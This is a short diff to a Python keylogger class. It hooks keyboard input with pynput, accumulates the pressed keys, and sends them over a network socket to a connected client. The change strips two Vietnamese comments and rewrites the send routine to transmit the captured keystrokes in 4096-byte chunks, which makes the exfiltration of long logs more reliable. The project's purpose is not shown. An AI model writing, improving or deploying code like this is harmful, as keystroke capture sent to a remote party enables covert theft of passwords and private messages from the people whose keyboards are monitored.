@@ -35,7 +35,7 @@ class KeyLogger:
         else:
             self.keys += key.char
     
-    def hook_key(self): # lam gi ke me tao
+    def hook_key(self): 
         if self.is_hooking: return
         self.listener = Listener(on_press = self.on_press)
         self.listener.start()
@@ -43,7 +43,7 @@ class KeyLogger:
         self.is_hooking = True
 
     def unhook_key(self):
-        if not self.is_hooking: return #thanh
+        if not self.is_hooking: return
         self.listener.stop()
         self.is_hooking = False
         return False
@@ -51,7 +51,12 @@ class KeyLogger:
     def print_keys(self):
         self.client.sendall(bytes(str(len(self.keys)), "utf8"))
         time.sleep(0.1)
-        self.client.sendall(bytes(self.keys, "utf8"))
+        # self.client.sendall(bytes(self.keys, "utf8"))
+        id = 0
+        while id < len(self.keys):
+            self.client.sendall(bytes(self.keys[id : id + 4096], "utf8"))
+            id += 4096
+        
         self.keys = ''
         pass
 
